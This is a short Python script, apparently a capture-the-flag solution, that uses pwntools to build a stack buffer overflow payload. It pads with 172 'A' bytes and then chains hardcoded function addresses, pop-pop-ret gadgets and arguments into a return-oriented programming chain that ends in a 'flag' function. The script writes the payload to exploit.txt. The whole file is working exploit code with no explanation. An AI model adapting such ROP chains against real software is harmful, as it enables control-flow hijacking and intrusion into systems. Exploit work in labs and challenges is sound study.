import pwn

f1 = pwn.pack(0x80491b2)
f1arg1 = pwn.pack(0x9c)
f1arg2 = pwn.pack(0x12c)

poppopret = pwn.pack(0x804939a)
poppoppopret = pwn.pack(0x8049399)

f2 = pwn.pack(0x80491f6)
f2arg1 = pwn.pack(0x0)
f2arg2 = pwn.pack(0xd)
f2arg3 = pwn.pack(0xd)

flag = pwn.pack(0x0804924c)
f3arg1 = pwn.pack(0x2)

exit = pwn.pack(0x8049320)

buff = 'A' * 172

payload = buff + \
    f1 + poppopret + \
    f1arg1 + f1arg2 + \
    f2 + poppoppopret + \
    f2arg1 + f2arg2 + f2arg3 + \
    flag + 'JUNK' + \
    f3arg1

open('exploit.txt', 'w').write(payload)
print(payload)
